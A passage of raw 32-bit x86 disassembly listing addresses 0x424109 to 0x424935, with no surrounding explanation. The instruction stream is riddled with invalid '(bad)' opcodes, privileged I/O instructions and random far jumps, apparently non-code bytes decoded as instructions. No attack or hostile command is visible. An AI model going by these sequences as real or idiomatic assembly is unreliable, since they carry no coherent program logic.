  424109:	sbb    eax,DWORD PTR [ecx+0x7f]
  42410c:	adc    BYTE PTR [esi+0x79],bl
  42410f:	push   edx
  424110:	fnstenv [esi]
  424112:	in     eax,0x2a
  424114:	pop    ebp
  424115:	xchg   edx,eax
  424116:	and    esp,esp
  424118:	les    esi,FWORD PTR [ebx]
  42411a:	inc    ebx
  42411b:	mov    edx,0x6377c0fd
  424120:	test   BYTE PTR [ecx],bl
  424122:	imul   edx,DWORD PTR [ecx+0x67],0x6a
  424126:	popa   
  424127:	mov    dh,0x8
  424129:	hlt    
  42412a:	rcl    DWORD PTR [edi],cl
  42412c:	sbb    dl,BYTE PTR gs:[eax-0x5755fbb1]
  424133:	ins    BYTE PTR es:[edi],dx
  424134:	cs mov ch,0xea
  424137:	scas   al,BYTE PTR es:[edi]
  424138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424139:	(bad)  
  42413a:	out    dx,al
  42413b:	cmp    BYTE PTR [eax-0x55c36ac1],ah
  424141:	shl    DWORD PTR [esi+eiz*4+0x6f],cl
  424145:	dec    esp
  424146:	adc    DWORD PTR [eax-0x409feb72],edi
  42414c:	stc    
  42414d:	(bad)  
  42414e:	fisub  DWORD PTR ds:0x11d5e7d8
  424154:	int3   
  424155:	and    BYTE PTR [ecx],0x91
  424158:	jl     0x424149
  42415a:	les    esp,FWORD PTR [ecx]
  42415c:	pop    edx
  42415d:	add    BYTE PTR [ecx+0x6651ebfd],0x89
  424164:	mov    al,0x1
  424166:	dec    ebp
  424167:	(bad)  
  424168:	rcr    DWORD PTR [edx+0x3d],cl
  42416b:	jno    0x424114
  42416d:	and    BYTE PTR [eax],al
	...
  424177:	add    BYTE PTR [eax],al
  424179:	add    BYTE PTR [ebp-0x4c],ah
  42417c:	sbb    dh,bl
  42417e:	fsin   
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	pop    ecx
  424187:	cwde   
  424188:	and    DWORD PTR [ecx+0x1ba98],0x1fc
  424192:	ds mov bh,0xcd
  424195:	out    dx,eax
  424196:	sub    esp,DWORD PTR [ecx+eax*4+0x75]
  42419a:	cmp    WORD PTR [eax],ax
  42419d:	test   al,0xd4
  42419f:	mov    esp,0x8e541246
  4241a4:	rol    BYTE PTR [ecx+ecx*4+0x70f594a5],cl
  4241ab:	push   eax
  4241ac:	sahf   
  4241ad:	add    ah,BYTE PTR [ecx-0x70]
  4241b0:	mov    cl,0x7a
  4241b2:	mov    ebp,0x5190ec61
  4241b7:	cli    
  4241b8:	prefetchw BYTE PTR [edi+0x37ceb453]
  4241bf:	mov    dh,0x3a
  4241c1:	or     eax,0xde5e9512
  4241c6:	stos   DWORD PTR es:[edi],eax
  4241c7:	out    dx,eax
  4241c8:	adc    cl,BYTE PTR ds:[ebp+0x54]
  4241cc:	popa   
  4241cd:	in     al,0x8d
  4241cf:	fsubrp st(1),st
  4241d1:	mov    bh,0x5a
  4241d3:	push   0xffffffda
  4241d5:	jns    0x42419b
  4241d7:	dec    esp
  4241d8:	std    
  4241d9:	jmp    0x8a08bfdb
  4241de:	mov    dl,BYTE PTR [esp+edx*4+0x1bc099af]
  4241e5:	sub    al,BYTE PTR [edi+0x6]
  4241e8:	out    dx,al
  4241e9:	icebp  
  4241ea:	push   esp
  4241eb:	push   esp
  4241ec:	cmc    
  4241ed:	in     eax,0x3d
  4241ef:	adc    BYTE PTR [edx],0x88
  4241f2:	push   ds
  4241f3:	je     0x424223
  4241f5:	imul   edi,DWORD PTR [ebp+0x13a1ec14],0x5b
  4241fc:	push   eax
  4241fd:	push   ecx
  4241fe:	in     al,dx
  4241ff:	fucomp st(2)
  424201:	xor    esp,DWORD PTR [ebx]
  424203:	adc    bh,dl
  424205:	mov    bl,0x30
  424207:	cmp    bh,BYTE PTR [eax]
  424209:	sbb    edx,DWORD PTR [eax-0x24797a71]
  42420f:	mov    ch,BYTE PTR ss:[eax-0x7cff9c2c]
  424216:	(bad)  
  424217:	mul    DWORD PTR [edx]
  424219:	bound  esi,QWORD PTR [ecx]
  42421b:	push   esi
  42421c:	inc    esi
  42421d:	xchg   ebx,eax
  42421e:	inc    esp
  42421f:	je     0x424255
  424221:	dec    esi
  424222:	or     bl,cl
  424224:	mov    edi,0x4fa03c2f
  424229:	mov    eax,0xd2efc842
  42422e:	xor    BYTE PTR [ebp+0x30401397],ah
  424234:	dec    edi
  424235:	inc    esp
  424236:	inc    edx
  424237:	jmp    0xc3db:0x259cec5a
  42423e:	or     al,0x67
  424240:	lea    ebp,[ecx]
  424242:	repz push edx
  424244:	jae    0x42425e
  424246:	nop
  424247:	xor    DWORD PTR [eax+eax*1+0x63],esp
  42424b:	xor    BYTE PTR es:[edx],al
  42424e:	aam    0x57
  424250:	aam    0x89
  424252:	scas   al,BYTE PTR es:[edi]
  424253:	fst    st(5)
  424255:	or     ah,BYTE PTR [ebp+esi*1-0x1918b7b9]
  42425c:	outs   dx,DWORD PTR ds:[esi]
  42425d:	sbb    DWORD PTR [edi],ebx
  42425f:	cmc    
  424260:	into   
  424261:	and    DWORD PTR [ebp-0x4c],edx
  424264:	mov    BYTE PTR [edx],cl
  424266:	call   0x22d3f368
  42426b:	mov    dl,0xbc
  42426d:	xor    BYTE PTR [ecx+0x1eaad676],ch
  424273:	add    DWORD PTR [ebx+ebx*4-0x3d],eax
  424277:	adc    DWORD PTR [ecx+0x575b4d3e],ebx
  42427d:	inc    edx
  42427e:	shr    DWORD PTR [ecx-0x29],0x72
  424282:	cmp    ch,BYTE PTR [ecx+esi*8-0x24]
  424286:	xchg   ebx,eax
  424287:	adc    dl,dh
  424289:	inc    esi
  42428a:	jmp    0x424237
  42428c:	mov    bh,0xc8
  42428e:	mov    bl,0xf7
  424290:	aam    0xec
  424292:	xchg   ebx,eax
  424293:	js     0x424232
  424295:	jg     0x424236
  424297:	nop
  424298:	(bad)  
  424299:	inc    eax
  42429a:	adc    DWORD PTR [esp+eiz*8+0x5802788f],0x1
  4242a2:	mov    dl,dh
  4242a4:	jbe    0x4242ab
  4242a6:	shl    BYTE PTR [ebp+0x65],cl
  4242a9:	inc    ecx
  4242aa:	jmp    0x42426b
  4242ac:	and    edi,eax
  4242ae:	jb     0x424327
  4242b0:	sub    BYTE PTR [ebx-0x646367cf],ch
  4242b6:	lods   al,BYTE PTR ds:[esi]
  4242b7:	outs   dx,BYTE PTR ds:[esi]
  4242b8:	adc    DWORD PTR [eax],edi
  4242ba:	and    DWORD PTR [edx+0x24],0xd4e8ebb
  4242c1:	out    dx,eax
  4242c2:	inc    edx
  4242c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242c4:	sbb    eax,0xae9007be
  4242c9:	lods   eax,DWORD PTR ds:[esi]
  4242ca:	jge    0x42433d
  4242cc:	ffree  st(3)
  4242ce:	dec    edi
  4242cf:	iret   
  4242d0:	push   0x3ed5e225
  4242d5:	xchg   esp,eax
  4242d6:	aaa    
  4242d7:	hlt    
  4242d8:	jge    0x424320
  4242da:	pop    ss
  4242db:	xchg   esp,eax
  4242dc:	rcl    ch,cl
  4242de:	cs repz out 0xea,al
  4242e2:	mov    ch,0x99
  4242e4:	call   0x91cb:0x649b96df
  4242eb:	xor    BYTE PTR [eax],0xc4
  4242ee:	or     ecx,edi
  4242f0:	jb     0x42427b
  4242f2:	loop   0x4242fa
  4242f4:	push   0xcb78c734
  4242f9:	and    bl,BYTE PTR [esi+0x6c]
  4242fc:	imul   edx,eax,0x37
  4242ff:	loopne 0x4242f5
  424301:	mov    ebp,fs
  424303:	push   eax
  424304:	fidivr DWORD PTR [ecx-0x76]
  424307:	sbb    DWORD PTR [ecx-0x6285e6f9],edx
  42430d:	enter  0x25a7,0xb2
  424311:	sbb    DWORD PTR [ebp+ebp*1-0x48d1629a],edi
  424318:	adc    al,0x1a
  42431a:	push   esp
  42431b:	xor    bl,bl
  42431d:	xchg   esp,eax
  42431e:	xchg   edx,eax
  42431f:	mov    eax,0x516f253e
  424324:	hlt    
  424325:	inc    esp
  424326:	or     eax,esp
  424328:	clc    
  424329:	push   edi
  42432a:	mov    BYTE PTR [edi],al
  42432c:	aaa    
  42432d:	stos   DWORD PTR es:[edi],eax
  42432e:	and    esp,esi
  424330:	(bad)  
  424331:	fst    DWORD PTR [ebx+0x28]
  424334:	aaa    
  424335:	nop
  424336:	int    0x4d
  424338:	inc    edi
  424339:	cmp    eax,0xadae7a3a
  42433e:	iret   
  42433f:	jae    0x424313
  424341:	data16 adc al,0x23
  424344:	xchg   BYTE PTR [edi+0x27],bh
  424347:	xor    edi,esi
  424349:	cmp    esi,DWORD PTR [ebp+0x7495de89]
  42434f:	mov    ecx,0xe9fc0dc1
  424354:	popf   
  424355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424356:	jmp    0x683f:0xab99a28d
  42435d:	jb     0x42437c
  42435f:	cmp    BYTE PTR [edi+0x43],cl
  424362:	xor    dl,BYTE PTR [esi]
  424364:	ret    0xe302
  424367:	rcr    DWORD PTR [eax],cl
  424369:	pusha  
  42436a:	xor    esi,edi
  42436c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42436d:	xchg   DWORD PTR [edi+0x5ffa60ad],eax
  424373:	cs pop eax
  424375:	lahf   
  424376:	pop    ss
  424377:	pop    esp
  424378:	fistp  QWORD PTR [ebp+0x1f5d8f41]
  42437e:	cmp    al,0xe3
  424380:	not    DWORD PTR [ebx+0x28780625]
  424386:	test   eax,0xe7e10eb9
  42438b:	mov    ds:0xb44b,eax
	...
  424398:	add    BYTE PTR [eax],al
  42439a:	adc    bl,al
  42439c:	arpl   WORD PTR [edx-0x15],si
  42439f:	sti    
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	push   edx
  4243a7:	mov    dh,0xbc
  4243a9:	xchg   DWORD PTR [esp+edi*4+0x1fc0001],edx
  4243b0:	add    BYTE PTR [eax],al
  4243b2:	lahf   
  4243b3:	(bad)  [ebx-0x30]
  4243b6:	mov    esp,0xa280d75
  4243bb:	loopne 0x4243dc
  4243bd:	(bad)  
  4243be:	(bad)  
  4243bf:	les    eax,FWORD PTR gs:[edi-0x3b6a8c67]
  4243c6:	call   0xeef0:0x52cbf4c8
  4243cd:	sub    al,0xcc
  4243cf:	popa   
  4243d0:	jmp    0x2fab:0xea0d6f99
  4243d7:	pop    es
  4243d8:	xor    DWORD PTR [edx+0x55],0xdb8d46ba
  4243df:	mov    cl,0xef
  4243e1:	out    0x6e,eax
  4243e3:	sbb    BYTE PTR [ebx-0x8],0xb9
  4243e7:	xor    BYTE PTR [esi+0x6a],0x59
  4243eb:	jbe    0x424445
  4243ed:	mov    ch,0x64
  4243ef:	xor    DWORD PTR [ebx+ebp*8-0x4544a9e9],esp
  4243f6:	jne    0x42442c
  4243f8:	mov    eax,ebx
  4243fa:	or     eax,0x17d3b061
  4243ff:	bound  eax,QWORD PTR [ebx+ecx*2+0x4]
  424403:	pop    edi
  424404:	push   ebx
  424405:	lds    ecx,FWORD PTR [ecx+0x4dcfb7bc]
  42440b:	adc    esi,ecx
  42440d:	test   BYTE PTR [ecx],dh
  42440f:	jmp    0xd7579407
  424414:	mov    bl,0x90
  424416:	mov    bh,0xbd
  424418:	ins    DWORD PTR es:[edi],dx
  424419:	xchg   ecx,eax
  42441a:	push   esi
  42441b:	xchg   esp,eax
  42441c:	or     ecx,esp
  42441e:	scas   al,BYTE PTR es:[edi]
  42441f:	mov    ch,BYTE PTR [edx-0x64]
  424422:	test   ecx,eax
  424424:	aam    0x7c
  424426:	shr    DWORD PTR [eax],1
  424428:	mov    ebp,0x2f6282
  42442d:	cmp    DWORD PTR [esi-0x5d6fb39a],0xffffff80
  424434:	dec    edi
  424435:	cdq    
  424436:	add    al,0xf2
  424438:	cmp    edx,ecx
  42443a:	(bad)  
  42443b:	outs   dx,BYTE PTR ds:[esi]
  42443c:	pop    es
  42443d:	(bad)  
  42443e:	leave  
  42443f:	mov    dh,0xab
  424441:	fldenv [esi]
  424443:	mov    esi,esi
  424445:	sub    DWORD PTR [ebx],0xce65bcb3
  42444b:	adc    edi,esi
  42444d:	ret    0xfdc5
  424450:	sti    
  424451:	mov    cl,0x50
  424453:	pusha  
  424454:	add    DWORD PTR ds:0x31831ffb,0x25afa22c
  42445e:	cmp    cl,dl
  424460:	mov    WORD PTR [ecx+0x20cc734c],fs
  424466:	jns    0x4244d3
  424468:	xchg   edi,eax
  424469:	or     BYTE PTR [esi+edi*4+0x967ef34],ah
  424470:	mov    ebp,0x2b6daa61
  424475:	pop    ds
  424476:	and    al,0x71
  424478:	xor    dl,BYTE PTR ds:0xf35f23ae
  42447e:	or     eax,0xb61523a3
  424483:	out    dx,al
  424484:	(bad)  
  424485:	dec    esp
  424486:	inc    ebx
  424487:	sbb    ebx,DWORD PTR [ecx-0x5e3c2691]
  42448d:	out    0x50,eax
  42448f:	cmc    
  424490:	into   
  424491:	js     0x42450d
  424493:	lods   eax,DWORD PTR ds:[esi]
  424494:	nop
  424495:	pop    esi
  424496:	add    DWORD PTR [edx-0x5b],esp
  424499:	rcr    bh,1
  42449b:	stc    
  42449c:	inc    ebp
  42449d:	addr16 sbb ebp,ebp
  4244a0:	xchg   DWORD PTR [ecx*8+0x386364c6],edi
  4244a7:	out    dx,eax
  4244a8:	ss xor al,0x63
  4244ab:	fisubr WORD PTR [edx+edi*1-0x45]
  4244af:	leave  
  4244b0:	(bad)  
  4244b1:	(bad)  
  4244b3:	mul    DWORD PTR [edi+0x6f]
  4244b6:	lahf   
  4244b7:	lds    edi,FWORD PTR [ebx]
  4244b9:	idiv   DWORD PTR [eax+edi*1-0x59]
  4244bd:	sbb    ecx,DWORD PTR [edi-0x4f]
  4244c0:	push   cs
  4244c1:	adc    edi,DWORD PTR [edx]
  4244c3:	xor    al,0x9e
  4244c5:	sub    eax,0x72da3d72
  4244ca:	pushf  
  4244cb:	mov    dh,0x74
  4244cd:	xchg   esi,eax
  4244ce:	ins    BYTE PTR es:[edi],dx
  4244cf:	fstp   DWORD PTR [ebp+0x3112c1cf]
  4244d5:	sub    DWORD PTR [eax],esp
  4244d7:	push   ebp
  4244d8:	jmp    0x4ee0:0xace33131
  4244df:	pop    es
  4244e0:	(bad)  
  4244e1:	dec    eax
  4244e2:	jnp    0x424471
  4244e4:	jbe    0x4244e4
  4244e6:	jb     0x4244e0
  4244e8:	inc    ebp
  4244e9:	(bad)  
  4244eb:	in     al,dx
  4244ec:	(bad)  
  4244ed:	fcomp  DWORD PTR [eax-0xb8d84f6]
  4244f3:	fidivr DWORD PTR [ebx+0x71]
  4244f6:	retf   
  4244f7:	ins    BYTE PTR es:[edi],dx
  4244f8:	push   0xffffffec
  4244fa:	cmp    edi,DWORD PTR [edx+0x4f]
  4244fd:	jbe    0x4244d0
  4244ff:	shl    esp,1
  424501:	jl     0x42450d
  424503:	clc    
  424504:	mov    esp,0xb66ec6a7
  424509:	ja     0x4244cc
  42450b:	or     edx,DWORD PTR [eax]
  42450d:	cli    
  42450e:	mov    ebx,esi
  424510:	and    BYTE PTR [edi],bl
  424512:	cld    
  424513:	cmp    eax,0x806e425d
  424518:	xchg   edi,eax
  424519:	push   cs
  42451a:	mov    bh,0xe8
  42451c:	pop    esp
  42451d:	fld    DWORD PTR [ecx-0x56930f70]
  424523:	inc    edi
  424524:	mov    bh,0x58
  424526:	ja     0x424523
  424528:	xchg   esp,eax
  424529:	inc    esi
  42452a:	and    DWORD PTR [ecx],ebp
  42452c:	aas    
  42452d:	lea    eax,[esi+0x7c9e47d8]
  424533:	add    BYTE PTR es:[edx],ah
  424536:	sbb    ebp,DWORD PTR [eax-0x18]
  424539:	call   0xa7b8:0xcdbf7caa
  424540:	stos   BYTE PTR es:[edi],al
  424541:	(bad)  
  424542:	mov    dl,ah
  424544:	pusha  
  424545:	je     0x4245b5
  424547:	push   edi
  424548:	dec    ecx
  424549:	addr16 (bad) 
  42454b:	push   ss
  42454c:	sbb    al,0x47
  42454e:	pop    eax
  42454f:	(bad)  
  424550:	push   ds
  424551:	cmp    al,0xfe
  424553:	mov    eax,ds:0x195e8a8b
  424558:	(bad)  
  424559:	cmc    
  42455a:	out    0x90,al
  42455c:	stc    
  42455d:	add    bh,dl
  42455f:	jge    0x4245b2
  424561:	push   cs
  424562:	mov    ch,0xc6
  424564:	and    al,0x36
  424566:	(bad)  
  424568:	dec    ecx
  424569:	xor    esi,DWORD PTR [esi-0x1d8bf9b9]
  42456f:	cdq    
  424570:	cdq    
  424571:	adc    DWORD PTR [esi-0x52],eax
  424574:	cmp    esp,esp
  424576:	daa    
  424577:	rcl    BYTE PTR [ebp+0xa6f7299],0xb6
  42457e:	pusha  
  42457f:	adc    ecx,DWORD PTR [edx+0x4271c4c8]
  424585:	gs inc esp
  424587:	and    BYTE PTR [ebp-0x247c178d],dh
  42458d:	shr    ah,1
  42458f:	scas   al,BYTE PTR es:[edi]
  424590:	inc    ebx
  424591:	and    eax,0x85da1db4
  424596:	call   0x86ee:0xee237f0c
  42459d:	add    bh,BYTE PTR [ebx]
  42459f:	add    al,0x27
  4245a1:	inc    eax
  4245a2:	retf   
  4245a3:	jl     0x42457b
  4245a5:	cmp    DWORD PTR [ebp+0x20bac278],esp
  4245ab:	loope  0x424543
  4245ad:	xor    eax,0x0
	...
  4245ba:	push   cs
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax-0x31d8c549]
  4245c9:	in     eax,0x90
  4245cb:	mov    esi,0x1fc0001
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	pop    esp
  4245d3:	xlat   BYTE PTR ds:[ebx]
  4245d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	cld    
  4245d6:	stos   BYTE PTR es:[edi],al
  4245d7:	ret    0x4c5f
  4245da:	add    al,0xfd
  4245dc:	xor    DWORD PTR [edx-0x4f],ebx
  4245df:	mov    bl,0x69
  4245e1:	addr16 int 0x2c
  4245e4:	or     eax,0x88c0bd94
  4245e9:	xchg   ebp,eax
  4245ea:	xor    DWORD PTR [edi],ecx
  4245ec:	call   DWORD PTR [eax+eax*1+0x6f]
  4245f0:	cdq    
  4245f1:	inc    ebp
  4245f2:	mov    DWORD PTR [ebx+0x42],ebx
  4245f5:	stos   BYTE PTR es:[edi],al
  4245f6:	xlat   BYTE PTR ds:[ebx]
  4245f7:	and    dl,BYTE PTR [esi]
  4245f9:	push   cs
  4245fa:	aad    0x10
  4245fc:	adc    cl,dl
  4245fe:	sub    al,0x2b
  424600:	rcl    DWORD PTR [edx],0x92
  424603:	cs fcom st(6)
  424606:	sub    BYTE PTR cs:[edi-0x6b],0x1e
  42460b:	jnp    0x42463e
  42460d:	xlat   BYTE PTR ds:[ebx]
  42460e:	out    0x77,eax
  424610:	std    
  424611:	stos   BYTE PTR es:[edi],al
  424612:	mov    ebp,0x12393dcb
  424617:	lock xor DWORD PTR [ecx-0x6bbf7262],esp
  42461e:	mov    edi,0x8211011c
  424623:	xchg   ebx,eax
  424624:	outs   dx,DWORD PTR ds:[esi]
  424625:	xor    eax,DWORD PTR ds:0x6eff341c
  42462b:	dec    eax
  42462c:	push   es
  42462d:	(bad)  
  42462e:	mov    dl,0x5b
  424630:	jbe    0x424649
  424632:	loopne 0x424608
  424634:	pusha  
  424635:	sbb    DWORD PTR [esi+0x3b06df73],esp
  42463b:	je     0x4245c0
  42463d:	or     eax,0xfbc6a8a2
  424642:	jne    0x4245db
  424644:	and    DWORD PTR [ecx+0x52352ed8],0x63
  42464b:	lods   eax,DWORD PTR ds:[esi]
  42464c:	and    esp,esp
  42464e:	test   DWORD PTR [edx-0x63],edi
  424651:	add    edi,DWORD PTR [edx+0x57faeb4]
  424657:	std    
  424658:	call   0xad5ed407
  42465d:	std    
  42465e:	addr16 push edi
  424660:	mov    ds:0x3a660c14,eax
  424665:	addr16 icebp 
  424667:	iret   
  424668:	stos   DWORD PTR es:[edi],eax
  424669:	pop    edx
  42466a:	or     al,0x64
  42466c:	div    BYTE PTR [esi-0x57]
  42466f:	fsubr  DWORD PTR [esi]
  424671:	inc    edi
  424672:	test   eax,0x65e573f3
  424677:	cmp    edi,DWORD PTR [esi]
  424679:	cdq    
  42467a:	ret    0xd0f2
  42467d:	cdq    
  42467e:	sbb    BYTE PTR [edi-0x73690e3a],dl
  424684:	push   edx
  424685:	sub    dl,ch
  424687:	nop
  424688:	data16 and al,0x7b
  42468b:	call   0x99d9:0xadd54f7b
  424692:	and    al,0x7e
  424694:	out    dx,al
  424695:	add    bl,BYTE PTR [edi]
  424697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424698:	jmp    DWORD PTR [eax+eiz*2]
  42469b:	mov    eax,0x37d6908d
  4246a0:	xor    ch,al
  4246a2:	xor    BYTE PTR [edi+0x4465d5a6],al
  4246a8:	mov    al,ds:0xcba45957
  4246ad:	pop    ebp
  4246ae:	cmp    DWORD PTR [edi],0x16e83881
  4246b4:	add    eax,0x8d38a0dc
  4246b9:	xchg   edx,eax
  4246ba:	cwde   
  4246bb:	fs inc ecx
  4246bd:	pop    edx
  4246be:	mov    edx,0x2570c801
  4246c3:	stos   DWORD PTR es:[edi],eax
  4246c4:	popf   
  4246c5:	mov    edx,0x9fe13ed3
  4246ca:	inc    ecx
  4246cb:	rcl    BYTE PTR [esi+0x9],cl
  4246ce:	cmp    ebp,eax
  4246d0:	retf   0x5a51
  4246d3:	xlat   BYTE PTR ds:[ebx]
  4246d4:	sbb    eax,0x6f52c0a
  4246d9:	push   eax
  4246da:	adc    ebx,esi
  4246dc:	in     eax,dx
  4246dd:	and    eax,0xe0c34174
  4246e2:	lods   al,BYTE PTR ds:[esi]
  4246e3:	or     al,0x78
  4246e5:	pop    ebp
  4246e6:	fld    DWORD PTR [eax-0x9]
  4246e9:	mov    ecx,0xb94fa841
  4246ee:	sub    DWORD PTR [esp+esi*1-0x6c00c05],esp
  4246f5:	or     DWORD PTR [ecx-0x80],0xffffffd9
  4246f9:	call   0x7134c1c9
  4246fe:	data16 test al,0xe1
  424701:	into   
  424702:	cwde   
  424703:	imul   edx,DWORD PTR [ebx-0xcc9f9b4],0xffffffb9
  42470a:	and    eax,0xa795cebc
  42470f:	in     eax,0x65
  424711:	ss cmp eax,0x3db8c36b
  424717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424718:	loopne 0x42469d
  42471a:	scas   al,BYTE PTR es:[edi]
  42471b:	fst    DWORD PTR [esi+ecx*1-0x59]
  42471f:	fimul  WORD PTR [edx+0x12]
  424722:	add    ecx,DWORD PTR [ebp-0x7dbfbb9a]
  424728:	pop    esi
  424729:	push   edi
  42472a:	in     al,dx
  42472b:	push   ebp
  42472c:	mov    esp,0xeecbf6eb
  424731:	call   0x3261:0x95f1c497
  424738:	jns    0x424786
  42473a:	jns    0x424752
  42473c:	pop    ss
  42473d:	push   0xd7ca4fba
  424742:	dec    edx
  424743:	dec    ecx
  424744:	imul   ebx,DWORD PTR [eax-0x70a37aa4],0xac95e2c3
  42474e:	test   DWORD PTR ds:0x181a4a1d,ebp
  424754:	mov    ds:0x368bea11,eax
  424759:	test   BYTE PTR [ebp+0x16],0x4a
  42475d:	sti    
  42475e:	push   esp
  42475f:	mov    ds:0x37bd429a,eax
  424764:	ret    0xc695
  424767:	retf   
  424768:	stc    
  424769:	and    al,0x7a
  42476b:	fadd   QWORD PTR [ebx-0x5d213130]
  424771:	sbb    dl,ah
  424773:	shl    BYTE PTR [eiz*1+0x369fa7e0],cl
  42477a:	or     al,0xb7
  42477c:	nop
  42477d:	sub    DWORD PTR [esi-0x6d],esi
  424780:	mov    al,ds:0xf11e330b
  424785:	sbb    al,0x63
  424787:	lds    edi,FWORD PTR [esi+0x68]
  42478a:	jecxz  0x424736
  42478c:	or     eax,0x53f3d7c2
  424791:	int    0x79
  424793:	repnz sub ebp,DWORD PTR [ecx-0x3a7c8365]
  42479a:	dec    edi
  42479b:	pop    edx
  42479c:	in     al,0x76
  42479e:	ret    0x1689
  4247a1:	push   esp
  4247a2:	aaa    
  4247a3:	sbb    ebp,DWORD PTR [eax+0x3c44e01b]
  4247a9:	push   eax
  4247aa:	push   cs
  4247ab:	sar    DWORD PTR [esi+ebp*2],1
  4247ae:	cmp    BYTE PTR [esi],dh
  4247b0:	pop    ecx
  4247b1:	adc    DWORD PTR [edx],esp
  4247b3:	mov    ds:0xeb032e17,al
  4247b8:	and    BYTE PTR [edx+0x51fa6beb],0x9b
  4247bf:	call   0xe45947b5
  4247c4:	cmp    BYTE PTR [eax*1-0x28db9837],bl
  4247cb:	imul   edi,DWORD PTR [ecx],0xffffffd1
	...
  4247da:	pop    esp
  4247db:	mov    edi,0xdce35063
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x3a
  4247e7:	js     0x424820
  4247e9:	enter  0xc08c,0x1
  4247ed:	add    ah,bh
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [ecx],ah
  4247f3:	fxch   st(2)
  4247f5:	div    BYTE PTR [esi-0x46b996ce]
  4247fb:	mov    ch,0xf3
  4247fe:	int3   
  4247ff:	mov    bh,0x17
  424801:	pop    ecx
  424802:	mov    bh,0xf1
  424804:	adc    cl,BYTE PTR [ebp+0x2ede6dc1]
  42480a:	xor    ah,al
  42480c:	mov    ecx,0x76bbd8db
  424811:	inc    eax
  424812:	je     0x4247e7
  424814:	push   0xffffffa4
  424816:	stc    
  424817:	neg    DWORD PTR [edx]
  424819:	mov    edx,0x31500464
  42481e:	gs push esi
  424820:	std    
  424821:	iret   
  424822:	pop    ebp
  424824:	jmp    0x1b3e676b
  424829:	push   0xc1bb4fd4
  42482e:	xchg   ebx,eax
  42482f:	adc    DWORD PTR [eax-0x6f],esp
  424832:	xchg   edi,eax
  424833:	pop    es
  424834:	and    dl,BYTE PTR [eax]
  424836:	sahf   
  424837:	(bad)  
  424838:	jne    0x424827
  42483a:	adc    eax,0x4f01ff40
  42483f:	mov    cl,0xac
  424841:	into   
  424842:	pop    ecx
  424843:	popf   
  424844:	arpl   WORD PTR [ecx-0x6c6817e6],si
  42484a:	(bad)  
  42484b:	sub    bl,ah
  42484d:	ret    
  42484e:	inc    edx
  42484f:	sub    BYTE PTR [bp+di+0x66],bh
  424853:	xor    edi,DWORD PTR [ecx-0x4d]
  424856:	push   eax
  424857:	jl     0x42480e
  424859:	xor    al,0xbd
  42485b:	push   ebx
  42485c:	icebp  
  42485d:	push   ebp
  42485e:	adc    eax,0x11b7968e
  424863:	retf   0x45f9
  424866:	fld    st(5)
  424868:	jmp    0xa4da:0xd1a17166
  42486f:	hlt    
  424870:	aaa    
  424871:	mov    ebp,0xe9b2310
  424876:	push   edi
  424877:	push   eax
  424878:	popa   
  424879:	fwait
  42487a:	push   ebp
  42487b:	fdivr  QWORD PTR [esi]
  42487d:	mov    esi,0x9ac157a4
  424882:	out    dx,eax
  424883:	xor    DWORD PTR [ebx-0x1359801b],0xffffffa2
  42488a:	mov    ecx,0x3828a8
  42488f:	ficomp WORD PTR [ebp-0x51]
  424892:	add    al,0x58
  424894:	xchg   ecx,eax
  424895:	cs (bad) 
  424897:	fnstenv [edi-0x26]
  42489a:	mov    ebx,0x8a976241
  42489f:	mov    dl,0xa
  4248a1:	out    dx,al
  4248a2:	mov    bl,cl
  4248a4:	jp     0x424881
  4248a6:	push   ds
  4248a7:	test   BYTE PTR [si],bl
  4248aa:	in     eax,0x49
  4248ac:	call   0x75117bc3
  4248b1:	fimul  DWORD PTR [edi+0x2b]
  4248b4:	jno    0x4248cf
  4248b6:	dec    ecx
  4248b7:	pop    edx
  4248b8:	sbb    al,0xe9
  4248ba:	mov    esp,0xd3ed573f
  4248bf:	pop    ecx
  4248c0:	jg     0x4248a0
  4248c2:	dec    esi
  4248c3:	sbb    al,0xd8
  4248c5:	loop   0x4248da
  4248c7:	jg     0x4248b3
  4248c9:	les    esp,FWORD PTR [edx+0x72]
  4248cc:	cmc    
  4248cd:	fidiv  DWORD PTR [ecx+0x6549a045]
  4248d3:	sbb    DWORD PTR [esp+ebx*2+0x5e1c0cf5],ecx
  4248da:	mov    ebp,0xee2ec6e4
  4248df:	xchg   ebp,eax
  4248e0:	test   edi,esi
  4248e2:	cs nop
  4248e4:	push   eax
  4248e5:	inc    ebp
  4248e6:	dec    ebx
  4248e7:	and    eax,0x7df1f5cb
  4248ec:	fldl2e 
  4248ee:	sbb    al,0x2
  4248f0:	test   eax,0xe74e35d5
  4248f5:	int3   
  4248f6:	pop    ebx
  4248f7:	or     ah,bl
  4248f9:	out    dx,al
  4248fa:	les    edx,FWORD PTR [ecx+0x1c4db52a]
  424900:	out    dx,al
  424901:	ins    BYTE PTR es:[edi],dx
  424902:	sbb    eax,0xf84dfc0d
  424907:	xor    BYTE PTR [ebp+0x69183674],0x47
  42490e:	inc    esp
  42490f:	ins    DWORD PTR es:[edi],dx
  424910:	outs   dx,BYTE PTR ds:[esi]
  424911:	daa    
  424912:	jbe    0x4248fa
  424914:	in     al,dx
  424915:	dec    ecx
  424916:	daa    
  424917:	(bad)  
  424918:	dec    ebx
  424919:	dec    esi
  42491a:	push   0x2d
  42491c:	pop    ebx
  42491d:	sub    eax,0x6cdec7b
  424922:	push   ds
  424923:	jle    0x424929
  424925:	ret    
  424926:	mov    WORD PTR [esp+ebp*1-0x58c1393c],?
  42492d:	fst    DWORD PTR [ebx-0x4292a83b]
  424933:	lods   al,BYTE PTR ds:[esi]
  424934:	dec    esi
  424935:	icebp  
